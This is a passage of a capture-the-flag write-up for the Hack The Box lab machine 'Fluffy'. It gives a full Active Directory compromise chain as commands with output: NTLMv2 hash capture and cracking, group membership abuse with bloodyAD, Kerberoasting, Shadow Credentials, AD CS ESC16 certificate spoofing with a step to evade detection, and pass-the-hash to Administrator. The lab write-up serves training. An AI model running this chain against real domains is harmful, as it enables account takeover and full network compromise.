
[+] Current Session Variables:
    Responder Machine Name     [WIN-WJCUZ8AJKL3]
    Responder Domain Name      [7CM5.LOCAL]
    Responder DCE-RPC Port     [48085]

[+] Listening for events...                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:1df6a109af3ff3a0:A0C4474DBC31D9CA402832B7B650F6D8:0101000000000000002938A58F27DC01A69DC6291DCD6E450000000002000800370043004D00350001001E00570049004E002D0057004A00430055005A00380041004A004B004C00330004003400570049004E002D0057004A00430055005A00380041004A004B004C0033002E00370043004D0035002E004C004F00430041004C0003001400370043004D0035002E004C004F00430041004C0005001400370043004D0035002E004C004F00430041004C0007000800002938A58F27DC01060004000200000008003000300000000000000001000000002000004A21E0C0AE2B45AC40ECD56BA9E2491A4D0218B9A6DC86B2828EB53E77D7F2240A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340031000000000000000000     
```

Hash cracking

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

```
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:02 DONE (2025-05-25 07:53) 0.4926g/s 2225Kp/s 2225Kc/s 2225KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                   
```

**Credential p.agila:prometheusx-303**


## Lateral movement

Upon reviewing group memberships and access control, we observed the following:

- The user `p.agila` is a member of the **SERVICE ACCOUNT MANAGER** group.
- This group has **GenericAll** permissions over the **SERVICE ACCOUNTS** group.

<img src="/assets/HTB/Fluffy/image3.png" alt="Error Loading Image" />

Furthermore, the **SERVICE Accounts** group has **GenericWrite** privileges over the following user accounts:

- `ca_svc`
- `winrm_svc`
- `ldap_svc`

<img src="/assets/HTB/Fluffy/image4.png" alt="Error Loading Image" />

### Generic All

First, we add the user p.agila to the Service Accounts group using BloodyAD:

```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
[+] p.agila added to Service Accounts                                       
```

### Shadow Credentials 

Next, I attempted a targeted Kerberoasting attack against the service accounts:

This successfully returned a service ticket hash; however, the hash could not be cracked using standard wordlists like rockyou.txt

```
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' 

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$9af66f97250096b8559310e135d7f7a2$5484c416759e38f3f199d20eb5e85c9fe3d49f7b7042ad3377a5bbbd56ff6189b26ae79394122bddac55503508cb778ebd21d4bcbcb0c72ecad4ebc6967bf0de058bd3a24ae7706a646549613c85018d5a4ebbee5e28f625cdd71f50fe23301cb2c0ffb61f647a2d373cc7aeef1d45c4af9299e85642ce58c6dcada73289290fb659f51875010bf45901e56c339ac3c06628ea833f659daaddae662cedc3b7ff6a8dce0aeb90cb227fbe49f1b7e7f23495bdd2372ef00703b2d1eabff9fba310e0734b3131690be71a06390b0ee79de16b6d62643c4a5bb2a94496a32e5f809008ea788a92c4eafecd9703c4920a36e29f4cb33df757a2d86c701a94566c4619cc23fbbccf7914c33e3377e40b1c80872ffcf983c6925b0c699701c747c9b03d2f58c64574f1f9d3575bf934c48b00f464076bc75026d8da5207c6fffae5dfb311336cd9a256610244d62cc40f40e2a7e4
.
.
.
.
.
.
.

```

Now we performed a Shadow Credentials Attack using Certipy.

```
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC                  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c08bbd98-3dd7-8f4a-e78c-91119cf8855f'
[*] Adding Key Credential with device ID 'c08bbd98-3dd7-8f4a-e78c-91119cf8855f' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'c08bbd98-3dd7-8f4a-e78c-91119cf8855f' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```

```
evil-winrm -i $IP -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'               
```
```
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ evil-winrm -i $IP -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt
**********ba5b84feed2107fa7af
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> exit
```

## Privilege Escalation ADCS ESC 16


A detailed blog post I wrote, where I explain the AD CS ESC16 misconfiguration and its exploitation in depth. You can read the full article **[Here](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)**.

We first leveraged our GenericWrite rights to perform a Shadow Credentials attack against the ca_svc account.

```
certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account CA_SVC
```

```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account CA_SVC   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '24dac53a-f906-d5fa-9a02-f58b3b15029c'
[*] Adding Key Credential with device ID '24dac53a-f906-d5fa-9a02-f58b3b15029c' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '24dac53a-f906-d5fa-9a02-f58b3b15029c' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
                                                            
```


After obtaining ca_svc access, we enumerated the Certificate Templates and Certificate Authority (CA) using Certipy:

```
┌──(certipy-venv)─(kali㉿kali)-[~/HTB-machine/fluffy/Certipy-5.0.2]
└─$ certipy find -vulnerable -u ca_svc@fluffy.htb -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates                                                                                         
```

**ESC16** misconfiguration was discovered.

Updates the `ca_svc` account's UPN to `administrator`, enabling certificate spoofing.

```bash                                       
┌──(kali㉿kali)-[~/HTB-machine/fluffy/Certipy-5.0.2]
└─$ certipy account -u 'p.agila@fluffy.htb' -p'prometheusx-303' -target 'dc01.fluffy.htb'  -upn 'administrator' -user 'ca_svc' update

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```                                                                                                       

Requests a certificate for the administrator user via the vulnerable CA template.

```bash                                                                        
┌──(kali㉿kali)-[~/HTB-machine/fluffy/Certipy-5.0.2]
└─$ certipy req -dc-ip '10.10.11.69' -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```                                                                                                       

Reverts the ca_svc UPN back to its original value to avoid detection.

```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy/Certipy-5.0.2]
└─$ certipy account -u 'p.agila@fluffy.htb' -p'prometheusx-303' -target 'dc01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```                                                                                                       

Authenticates as administrator using the forged certificate and retrieves the TGT and NT hash.

```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy/Certipy-5.0.2]
└─$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e                                         
```

### Pass-the-Hash — Administrator Access

Using pass-the-hash, I accessed the system as Administrator:

```
evil-winrm -i $IP -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
```